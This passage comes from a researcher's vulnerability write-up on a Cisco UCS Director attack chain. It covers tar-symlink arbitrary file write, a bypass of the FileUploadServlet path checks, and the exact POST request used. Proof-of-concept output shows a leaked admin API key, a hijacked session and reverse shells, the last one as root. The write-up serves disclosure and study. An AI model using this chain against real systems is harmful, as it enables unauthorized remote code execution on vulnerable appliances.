/* 361 */           ApplianceFileUploadEntryFormPage.logger.info("Command Response: " + po.getOutput());
/*     */         } 
```

At *[3]* the code checks that the extension is of .ova and if so, proceeds to build a string array using the attacker controlled file that has been uploaded at *[4]*.

Finally at *[5]* the code attempts to execute `/bin/tar -xvf <attacker uploaded file>.ova`. It may appear that the attacker supplied filename could lead to command injection, but since the code is building an array, this is not the case.

### Exploitation

Arbitray tar extraction is a very interesting primitive. Whilst most offensive researchers would naturally think to use a relative path traversal, (un)fortunately the tar command *will not* decompress file paths with traversals inside of them, despite that being an expected behaviour!

After some thinking, I realized that it maybe possible to (ab)use a tar archive that contains a symlink that points to a dangerous path and then use another file (in the same tar) to write to that symlink creating an arbitrary write situation. Whilst the documentation of tar states that it requires the -P argument to extract files with symlinks *and* other files pointing to symlinks, on its own, it will still extract a tar archive with a single symlink in it. Cute.

```bash
saturn:~ mr_me$ tar -xvf poc.ova 
x si
x si/pwn: Cannot extract through symlink si/pwn
tar: Error exit delayed from previous errors.

saturn:~ mr_me$ ls -la si
lrw-r--r--  1 mr_me  staff  5 Dec 31  1969 si -> /tmp/
```

But, notice the behaviour without the -P ? A symlink is still created. This almost wouldn't have been a problem because a temporary directory is created using a timestamp and this would have had to been bruteforced, but as it turns out, we can leak it with an error message from the application.

This symlink is written to `/opt/infra/uploads/external/public/<timestamp>/`. That last directory is what changes, based on when the request is made. Given that we have this primitive, the checks in the `com.cloupia.client.web.FileUploadServlet` servlet class can now be bypassed because we have the symlink planted within the uploads path and the location leaked.

#### A Triple Check Bypass

Let's have a look at the code for the `com.cloupia.client.web.FileUploadServlet` servlet:

```java
/*     */   private void fileUpload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
/* 129 */     response.setHeader("expires", "-1");
/*     */     
/* 131 */     String filePath = request.getParameter("filePath");                                                   // 1
/*     */     
/* 133 */     if (filePath == null) {
/*     */       
/* 135 */       logger.error("filePath is null");
/* 136 */       sendResponseError(response, "Requires a valid filePath");
/*     */       
/*     */       return;
/*     */     } 
/*     */     
/* 141 */     logger.info("fileUpload filePath: " + filePath);
/*     */ 
/*     */     
/* 144 */     if (!filePath.startsWith("/opt/infra/uploads/"))                                                      // 2
/*     */     {
/*     */       
/* 147 */       filePath = "/opt/infra/uploads/" + filePath;
/*     */     }
/*     */     
/* 150 */     if (filePath.indexOf("../") != -1) {                                                                  // 3
/*     */       
/* 152 */       logger.error("filePath invalid directory traverse: " + filePath);
/* 153 */       sendResponseError(response, "Requires a valid filePath!");
/*     */       
/*     */       return;
/*     */     } 
/*     */     
/* 158 */     String errMesg = "Failed to load property due to ";
/* 159 */     String propertyFile = "/opt/infra/inframgr/service.properties";
/*     */     try {
/* 161 */       Properties properties = loadServiceProperties("/opt/infra/inframgr/service.properties");
/* 162 */       String unSupportedExt = (String)properties.get("UNSUPPORTED_FILE_EXTENSION");
/* 163 */       if (unSupportedExt != null) {
/*     */         
/* 165 */         String[] fileExtnSplit = unSupportedExt.split(",");
/* 166 */         for (String fileExtension : fileExtnSplit) {
/*     */           
/* 168 */           if (filePath.matches(".*(" + fileExtension + ")")) {
/*     */             
/* 170 */             logger.error("the filePath " + filePath + " matches with file extension " + fileExtension);
/* 171 */             sendResponseError(response, "Requires a valid file extension to upload!");
/*     */             
/*     */             return;
/*     */           } 
/*     */         } 
/* 176 */         logger.info("No unsupported extension found");
/*     */       
/*     */       }
/*     */       else {                                                                                              // 4
/*     */         
/* 181 */         logger.error("Property UNSUPPORTED_FILE_EXTENSION missing in/opt/infra/inframgr/service.properties");
/* 182 */         sendResponseError(response, "Missing property UNSUPPORTED_FILE_EXTENSION in /opt/infra/inframgr/service.properties!");
/*     */ 
/*     */         
/*     */         return;
/*     */       } 
/* 187 */     } catch (IOException ioExcep) {
/*     */       
/* 189 */       logger.error(errMesg + ioExcep.getMessage());
/* 190 */       sendResponseError(response, "Failed to load property!");
/*     */ 
/*     */       
/*     */       return;
/*     */     }
```

At *[1]* the code gets the `filePath` which is attacker controlled and at *[2]* the code checks that our string starts with "/opt/infra/uploads/". Great! We pass the first validation check!

Then the code checks "../" is not in our `filePath` at *[3]*. We can bypass that check too because we are pointing it to the symlink. Finally the the code checks that the file extension is not in this list at *[4]*:

```bash
[root@localhost ~]# cat /opt/infra/inframgr/service.properties | grep UNSUPPORTED_FILE_EXTENSION
UNSUPPORTED_FILE_EXTENSION = html,htm,js,jsp
```

You guessed it, we can also bypass that check too because our symlink has no extension! Suppose our symlink is called `si`, then attack string we use for the upload is:

`POST /app/ui/FileUploadServlet?filePath=external/public/1571743726801/si HTTP/1.1`

Chaining everything together, we get our cake and can eat it too.

```bash
saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.100.144 192.168.100.59
(+) eg: ./poc.py 192.168.100.144 192.168.100.59:1337

saturn:~ mr_me$ ./poc.py 192.168.100.144 192.168.100.59
(+) using default connectback port 4444
(+) created the exports directory!
(+) found an admins rest api key: 0A7DB7EC61204627BB833CE07AEA0F4C
(+) you are now admin with: JSESSIONID=ECAEF2D2CF7C4915E8FFA7FEB33995DB4D34445FDE1E24D2C58240FF66393631
(+) created the /opt/infra/uploads/multipart/a2htampra2Mub3Zh/khmjjkkc.ova file
(+) created objsession for the untar: OBJSESS1571747699398:189
(+) wrote target symlink!
(+) leaking symlink location, give me a few seconds...
(+) leaked symlink path: /opt/infra/uploads/external/public/1571747700876/
(+) triggered symlink write!
(+) bypassed the ../ and .jsp checks!
(+) starting handler on port 4444
(+) connection from 192.168.100.144
(+) pop thy shell!
id
uid=503(tomcatu) gid=503(tomcatg) groups=503(tomcatg) context=system_u:system_r:initrc_t:s0
uname -a
Linux localhost 2.6.32-754.6.3.el6.x86_64 #1 SMP Tue Oct 9 17:27:49 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
pwd
/opt/infra/web_cloudmgr/apache-tomcat/bin
```

Wait, didn't you say root access mr_me?

Yeah my bad. After grinding out 8 different post auth code exec bugs, I found out that a different web service (reachable from our authentication bypass) has a *by design feature* which is a built-in cloupia script interpreter allowing an authenticated attacker to execute arbitrary code as root. At that point, I didn't bother auditing any further and as it turns out, that's a forever day since Cisco declined to patch it:

```bash
saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.100.144 192.168.100.59
(+) eg: ./poc.py 192.168.100.144 192.168.100.59:1337

saturn:~ mr_me$ ./poc.py 192.168.100.144 192.168.100.59:1337
(+) created the exports directory!
(+) found an admins rest api key: 0A7DB7EC61204627BB833CE07AEA0F4C
(+) starting handler on port 1337
(+) triggering reverse shell wait a sec...
(+) connection from 192.168.100.144
(+) pop thy shell!
bash: no job control in this shell
[root@localhost inframgr]# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=system_u:system_r:initrc_t:s0
[root@localhost inframgr]#
```

You can see find the exploit code [here](/pocs/cve-2020-32{43,47}.py.txt) and [here](/pocs/src-2020-0014.py.txt). Excuse the py2 code eh?

## Conclusion

The ability to untar an untrusted file can break several assumptions made by developers and it's up to creative attackers to fully expose the impact of such a situation. Additionally, I still believe that applications *should not* allow by design remote code execution features but of course, if it's protected by authentication then you **really** want to make sure you don't have an authentication bypass vulnerability lurking in the code.